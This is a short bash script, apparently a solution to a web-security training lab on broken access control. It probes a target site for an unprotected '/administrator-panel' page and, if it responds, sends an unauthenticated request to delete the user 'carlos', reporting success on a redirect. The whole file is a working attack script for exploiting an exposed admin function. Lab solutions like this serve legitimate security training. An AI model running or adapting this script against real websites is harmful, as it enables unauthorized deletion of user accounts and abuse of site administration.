#!/bin/bash

function delete_user() {
  
  admin_panel="${url}/administrator-panel"
  response=$(curl -s -o /dev/null -w "%{http_code}" "${admin_panel}")

  echo "(+) Finding the admin panel..."
  if [[ "${response}" -eq 200 ]]; then
   echo "(+) Admin panel found!"
   delete_user="${url}/administrator-panel/delete?username=carlos"
   echo "(+) Deleting user Carlos..."
   response=$(curl -s -o /dev/null -w "%{http_code}" "${delete_user}")
    if [[ "${response}" -eq 302 ]]; then
      echo "(+) User Carlos deleted successfully!"
    else
      echo "(-) Something went wrong! Could not delete user Carlos"
    fi
  else
    echo "(-) Could not find admin panel."
    echo "(-) Exiting the script..."
  fi
}

if [[ $# -ne 1 ]]; then
  echo "(+) Usage: $0 website"
  echo "(+) Example: $0 www.example.com"
  exit 1
else
  echo "(+) Executing the script..."
  url="$1"
  delete_user "${url}"
fi
